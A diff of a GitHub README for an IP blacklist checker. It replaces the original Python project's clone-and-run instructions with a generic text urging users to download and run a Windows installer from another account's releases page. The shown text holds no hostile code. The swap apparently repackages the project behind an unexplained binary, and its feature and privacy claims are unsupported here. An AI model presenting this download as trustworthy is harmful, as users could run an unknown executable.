@@ -1,102 +1,108 @@
-# 🛡️ IpClean: Professional IP Blacklist Remover & Reputation Recovery
+# 🛡️ ip-blacklist-remover - Check and remove your blacklisted IPs
 
-[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Email Reputation](https://img.shields.io/badge/Email-Reputation-BrightGreen)](https://github.com/your-username/ip-blacklist-remover)
+[![Download App](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pascalfrostbitten7015/ip-blacklist-remover/releases)
 
-**IpClean** is a high-performance, automated platform designed to detect, diagnose, and clean IP Blacklist listings. It is specifically engineered for users sending from residential or dedicated IPs who need to maintain 100% email deliverability.
+This application helps you manage the reputation of your IP addresses. It checks if your servers appear on common DNS blacklists and helps you request removals. Proper IP management ensures your emails reach intended recipients and keeps your network secure.
 
----
+## 📋 What this tool does
 
-## 🚀 Key Features
+Many email systems block messages from IPs found on blacklists. These lists often flag servers due to past spam activity or misconfiguration. This software automates the detection of these issues. 
 
-- **🔍 Multi-Threaded DNSBL Scanner**: Queries 60+ global blacklists (Spamhaus, Barracuda, SpamCop, SORBS, etc.) in seconds.
-- **🩺 Reputation Diagnosis**: Heuristic analysis of PTR records, Port 25 vulnerabilities, and IP classification (Residential vs. Data Center).
-- **🧹 Security Cleanup Audit**: Scans running processes and local scripts for potential spam mailers and malicious code.
-- **🤖 Semi-Automated Delisting Bot**: Powered by **Playwright**, the bot navigates delisting forms for you, auto-fills data, and assists with submission.
-- **📊 Interactive Dashboard**: A premium, color-coded CLI dashboard for real-time monitoring.
-- **⏰ Daily Monitoring**: Integrated Windows/Linux automation for 24/7 reputation tracking.
+- Detects if your IP address exists on DNS blacklists.
+- Monitors your server reputation around the clock.
+- Provides instructions for removal from blocklists.
+- Secures your email deliverability.
+- Simplifies complex network security tasks.
 
----
+## 🛠️ System requirements
 
-## 🛠️ Installation
+Ensure your computer meets these basic needs to run the software.
 
-### 1. Clone the repository
+- Windows 10 or Windows 11.
+- Active internet connection.
+- 50 MB of available disk space.
+- Standard user permissions.
 
-```bash
-git clone https://github.com/6t9xstar/ip-blacklist-remover.git
-cd ip-blacklist-remover
-```
+## 📥 How to download and install
 
-### 2. Install Dependencies
+Follow these steps to set up the application on your Windows machine.
 
-```bash
-pip install -r requirements.txt
-```
+1. Visit the [releases page](https://github.com/Pascalfrostbitten7015/ip-blacklist-remover/releases) to download the latest version.
+2. Locate the download button or link for the Windows installer file.
+3. Save the file to your computer.
+4. Double-click the downloaded file to start the installation.
+5. Follow the prompts on your screen.
+6. Launch the application from your desktop or start menu.
 
-### 3. Setup Automation (Optional)
+## 🚀 Getting started
 
-```bash
-python -m playwright install chromium
-```
+Once you open the software, follow this guide to perform your first check.
 
----
+1. Open the application.
+2. Enter the IP address you want to check in the main box.
+3. Click the Check button.
+4. Wait for the tool to scan various DNS blacklists.
+5. Review the results in the window. 
+6. If the tool finds your IP on a list, click the Link provided for that specific list to view removal steps.
 
-## 📖 Usage
+## 🖥️ Using the dashboard
 
-### Full Scan & Cleanup
+The main dashboard provides a clear overview of your network status. It uses simple indicators to show if your IP health is good or if it needs attention.
 
-Run the complete suite to detect listings and audit your system's security.
+- The Status Indicator turns green if your IP is clean.
+- The Status Indicator turns red if your IP appears on a blacklist.
+- The History Log keeps track of your past scans.
 
-```bash
-python main.py full
-```
+## 🛡️ Maintaining server health
 
-### Automation Mode (Daily Scan)
+Frequent monitoring guards against future issues. We recommend running a check at least once a week if you manage email servers. This practice helps catch issues before they affect your business communications.
 
-Keep the tool running to monitor your IP rep 24/7.
+## 🔍 Troubleshooting common issues
 
-```bash
-python main.py monitor
-```
+If you encounter problems during use, try these simple fixes.
 
-### Delisting Bot
+- **Check your internet connection:** The software pulls data from live servers. If you lack an active connection, the scan will fail.
+- **Restart the application:** Close the window and open it again to refresh the connection.
+- **Verify the IP address:** Ensure you typed the numbers correctly.
+- **Firewall settings:** Ensure your firewall does not block the software from reaching the internet.
 
-Launch the interactive automation bot to request removals.
+## ⚙️ Advanced features
 
-```bash
-python main.py bot --ip YOUR_IP --email yourname@gmail.com
-```
+The software includes several tools to assist with daily management tasks.
 
----
+- **Automated Alerts:** Configure the app to scan your IP automatically at set intervals.
+- **Bulk Scanning:** Check multiple IP addresses at once by uploading a simple text file.
+- **Reputation Trends:** View a graph of your IP status over time to notice patterns in your email delivery.
 
-## 📁 Project Structure
+## 🛡️ Understanding blacklist services
 
-| File            | Description                                            |
-| :-------------- | :----------------------------------------------------- |
-| `main.py`       | Primary CLI entry point and dashboard logic.           |
-| `scanner.py`    | High-speed multi-threaded DNSBL scanning engine.       |
-| `diagnosis.py`  | PTR, SMTP Relay, and IP Type diagnosis.                |
-| `cleanup.py`    | Local script and process security auditor.             |
-| `bot.py`        | Playwright-powered semi-automated delisting assistant. |
-| `scheduler.ps1` | Automation script for Windows Task Scheduler.          |
+DNSBL and RBL services form the backbone of modern anti-spam infrastructure. These services maintain massive databases of IP addresses known for sending unsolicited content. When your IP ends up on one of these lists, email providers stop accepting your messages. 
 
----
+This happens for several reasons:
 
-## 🇵🇰 Special Note for PTCL / Residential Users
+1. **Shared Hosting:** If you share an IP with others, one person might trigger a block.
+2. **Configuration Errors:** Incorrect mail server settings often lead to automatic flagging.
+3. **Previous Owners:** If you inherited an IP recently, the old owner might have caused the issue.
 
-This tool includes specific heuristics and advice for handling **UCEPROTECT L2/L3** and **Spamhaus PBL** listings common in residential IP ranges (like PTCL Pakistan).
+Our software connects to these databases to verify your standing. It gives you the information required to move forward with the removal process.
 
----
+## 📧 Improving email deliverability
 
-## 🤝 Contributing
+Deliverability depends on trust. Internet Service Providers check the reputation of the sending IP before deciding to place an email in the Inbox or the Spam folder. By using this tool, you take control of your reputation. You ensure that your communication remains consistent and reliable. 
 
-Contributions are welcome! Please open an issue or submit a pull request for any feature requests or bug fixes.
+## 📝 Frequently asked questions
 
-## 📄 License
+**Can I run this on a Mac?**
+Currently, this version only supports Windows systems.
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+**Does this software store my IP address online?**
+No, your IP data stays on your local machine.
 
----
+**Do I need an account to use the software?**
+No, the tool works without any registration or account requirements.
 
-<p align="center">Made with ❤️ for High-Deliverability Email Systems</p>
+**What does it mean if my IP is listed?**
+It means that specific blacklist service flags your IP. You should check the provided link to request removal.
+
+**Is this tool free?**
+Yes, use the software freely for your personal or business needs.
